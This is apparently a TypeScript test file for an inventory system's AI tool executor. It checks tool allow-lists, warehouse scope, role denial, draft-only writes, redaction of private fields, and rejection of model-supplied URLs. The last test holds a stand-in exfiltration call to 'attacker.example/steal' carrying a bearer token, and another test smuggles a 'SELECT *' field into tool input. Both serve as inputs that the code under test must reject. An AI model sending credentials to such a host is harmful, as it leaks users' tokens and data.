// SPDX-License-Identifier: AGPL-3.0-only
import assert from "node:assert/strict";
import { test } from "node:test";
import type { Actor } from "@/platform/identity/actor";
import { createToolExecutor } from "./execute-tool";
import { TOOL_NAMES } from "./tool-registry";
import type { BusinessApiPort, ToolAuditPort, ToolContext } from "./ports";
import { BusinessApiError, createBusinessApi } from "../infrastructure/business-api";

const batchId = "11111111-1111-4111-8111-111111111111";
const warehouseId = "22222222-2222-4222-8222-222222222222";
const productId = "33333333-3333-4333-8333-333333333333";
const variantId = "44444444-4444-4444-8444-444444444444";
const uomId = "55555555-5555-4555-8555-555555555555";
const documentId = "66666666-6666-4666-8666-666666666666";
const actor: Actor = { userId: "staff-1", organizationId: "org-a", unitIds: [warehouseId], roles: ["inventory_clerk"] };

function fixture() {
  const calls: { method: string; path: string; body?: unknown; key?: string; auth: string }[] = [];
  const completions: { tool: string; outcome: string; sourceIds?: string[] }[] = [];
  let allow = true;
  let failStock = false;
  const api: BusinessApiPort = {
    async get(path, authorization) {
      calls.push({ method: "GET", path, auth: authorization });
      if (failStock && path.includes("/inventory/balances")) throw new BusinessApiError(403, "POLICY_DENIED");
      if (path === `/api/v1/batches/${batchId}`) return { data: {
        id: batchId, productId, productVariantId: variantId, localCode: "A-L1",
        originLot: { issuerInstanceId: "nexora-a", lotId: "A-L1" }, qualityStatus: "available",
        expiresOn: "2026-12-08T00:00:00.000Z",
      } };
      if (path.startsWith("/api/v1/batches?")) return { data: [{ id: batchId, productId,
        productVariantId: variantId, originLot: { issuerInstanceId: "nexora-a", lotId: "A-L1" },
        qualityStatus: "available", expiresOn: "2026-12-08T00:00:00.000Z" }], page: { nextCursor: null } };
      if (path === `/api/v1/products/${productId}`) return { data: { id: productId, name: "Rice" } };
      if (path === "/api/v1/uoms") return { data: [{ id: uomId, code: "EA", isActive: true }] };
      if (path === `/api/v1/variants/${variantId}/uoms`) return { data: [{ uomId, factorToStockUom: "1.000000" }] };
      if (path.startsWith("/api/v1/inventory/balances?")) return { data: [{
        warehouseId, quantity: "8.000", stockUomId: uomId,
        updatedAt: "2026-11-26T00:00:00.000Z", privateBuyer: "never return",
      }], page: { nextCursor: null } };
      if (path.startsWith(`/api/v1/lots/${batchId}/trace/`)) return { data: {
        nodes: [{ eventId: documentId, issuerInstanceId: "nexora-a",
          verificationState: "partner_asserted", eventType: "receipt", privatePayload: "never return" }],
        edges: [{ fromEventId: documentId, toEventId: batchId, relation: "derived_from" }],
        gaps: [{ state: "pending", reason: "upstream_offline" }],
        asOf: "2026-11-26T00:00:00.000Z",
      } };
      throw new Error(`Unexpected path ${path}`);
    },
    async post(path, body, authorization, _requestId, key) {
      calls.push({ method: "POST", path, body, key, auth: authorization });
      return { data: { id: documentId, status: "draft" } };
    },
  };
  const audit: ToolAuditPort = {
    async reserve() { return allow; },
    async complete(_actor, tool, _requestId, outcome, sourceIds) {
      completions.push({ tool, outcome, sourceIds });
    },
  };
  const ctx: ToolContext = { actor, authorization: "Bearer user.jwt.token", requestId: "request-1",
    idempotencyKey: "stable-key-123", now: () => new Date("2026-11-26T00:00:00Z") };
  return { run: createToolExecutor(api, audit), ctx, calls, completions,
    denyQuota: () => { allow = false; }, denyStock: () => { failStock = true; } };
}

test("five schema-bound tools exclude destructive actions and reject extra fields", async () => {
  assert.deepEqual([...TOOL_NAMES].sort(), ["getLot", "getStock", "getTrace", "createReceiptDraft", "createIssueDraft"].sort());
  const sample = fixture();
  await assert.rejects(sample.run("confirm", {}, sample.ctx), { code: "AI_TOOL_NOT_FOUND" });
  await assert.rejects(sample.run("getStock", { batchId, sql: "SELECT *" }, sample.ctx),
    { code: "AI_TOOL_INPUT_INVALID" });
  await assert.rejects(sample.run("getLot", { batchId, originIssuerId: "nexora-a" }, sample.ctx),
    { code: "AI_TOOL_INPUT_INVALID" });
  assert.equal(sample.calls.length, 0);
  assert.deepEqual(sample.completions.map((item) => item.outcome), ["deny", "deny"]);
});

test("out-of-scope staff cannot read warehouse stock or create drafts", async () => {
  const sample = fixture();
  const outside = "77777777-7777-4777-8777-777777777777";
  await assert.rejects(sample.run("getStock", { batchId, warehouseId: outside }, sample.ctx),
    { code: "WAREHOUSE_SCOPE_REQUIRED", httpStatus: 403 });
  await assert.rejects(sample.run("createReceiptDraft", { batchId, warehouseId: outside,
    quantity: "1", unit: "EA" }, sample.ctx), { httpStatus: 403 });
  assert.equal(sample.calls.length, 0);
  assert.deepEqual(sample.completions.map((item) => item.outcome), ["deny", "deny"]);
});

test("read tools return bounded sourced projections and never echo private fields", async () => {
  const sample = fixture();
  const lot = await sample.run("getLot", { originIssuerId: "nexora-a", originLotId: "A-L1" }, sample.ctx);
  const stock = await sample.run("getStock", { batchId, warehouseId }, sample.ctx);
  const trace = await sample.run("getTrace", { batchId, direction: "backward", depth: 2 }, sample.ctx);
  assert.equal((lot.product as { name: string }).name, "Rice");
  assert.equal(lot.expiresOn, "2026-12-08T00:00:00.000Z");
  assert.ok((lot.sourceIds as string[]).includes(batchId));
  assert.equal(stock.visibleTotalQuantity, "8.000");
  assert.equal(trace.asOf, "2026-11-26T00:00:00.000Z");
  assert.deepEqual(trace.verificationStates, ["partner_asserted"]);
  assert.equal(JSON.stringify({ lot, stock, trace }).includes("never return"), false);
  assert.deepEqual(sample.completions.map((item) => item.outcome), ["success", "success", "success"]);
  assert.ok(sample.calls.every((call) => call.auth === sample.ctx.authorization));
});

test("draft tools map to existing M03 create endpoints with stable idempotency, never confirm", async () => {
  const sample = fixture();
  const receipt = await sample.run("createReceiptDraft", { batchId, warehouseId,
    quantity: "2.000", unit: "EA" }, sample.ctx);
  const issue = await sample.run("createIssueDraft", { batchId, warehouseId,
    quantity: "3.000", unit: "EA", purpose: "sale" }, sample.ctx);
  assert.equal(receipt.status, "draft");
  assert.equal(issue.status, "draft");
  const writes = sample.calls.filter((call) => call.method === "POST");
  assert.deepEqual(writes.map((call) => call.path), ["/api/v1/receipts", "/api/v1/issues"]);
  assert.ok(writes.every((call) => call.key === "stable-key-123"));
  assert.ok(writes.every((call) => !JSON.stringify(call.body).includes("confirm")));
  assert.equal(sample.completions.filter((item) => item.outcome === "success").length, 2);
});

test("issue draft rejects insufficient stock and viewer cannot create any draft", async () => {
  const sample = fixture();
  await assert.rejects(sample.run("createIssueDraft", { batchId, warehouseId,
    quantity: "9.000", unit: "EA", purpose: "sale" }, sample.ctx),
  { code: "AI_STOCK_INSUFFICIENT", httpStatus: 422 });
  const viewer: ToolContext = { ...sample.ctx, actor: { ...actor, roles: ["auditor"] } };
  await assert.rejects(sample.run("createReceiptDraft", { batchId, warehouseId,
    quantity: "1", unit: "EA" }, viewer), { code: "POLICY_DENIED", httpStatus: 403 });
  assert.equal(sample.calls.filter((call) => call.method === "POST").length, 0);
});

test("business 403 and quota 429 stay denied under the current user", async () => {
  const sample = fixture();
  sample.denyStock();
  await assert.rejects(sample.run("getStock", { batchId }, sample.ctx), { httpStatus: 403 });
  assert.equal(sample.completions[0]?.outcome, "deny");
  sample.denyQuota();
  await assert.rejects(sample.run("getLot", { batchId }, sample.ctx), { httpStatus: 429 });
  assert.equal(sample.calls.filter((call) => call.method === "POST").length, 0);
});

test("business adapter rejects model-supplied URLs and fixes loopback destination", async () => {
  const called: string[] = [];
  const fakeFetch = (async (url: string | URL | Request) => {
    called.push(String(url));
    return new Response(JSON.stringify({ data: { id: batchId } }), {
      status: 200, headers: { "content-type": "application/json" },
    });
  }) as typeof fetch;
  const api = createBusinessApi(fakeFetch);
  await assert.rejects(api.get("https://attacker.example/steal", "Bearer user.jwt.token", "request-1"),
    { code: "AI_TOOL_ROUTE_INVALID" });
  assert.equal(called.length, 0);
  await api.get(`/api/v1/batches/${batchId}`, "Bearer user.jwt.token", "request-1");
  assert.match(called[0]!, /^http:\/\/127\.0\.0\.1:[0-9]+\/api\/v1\/batches\//);
});
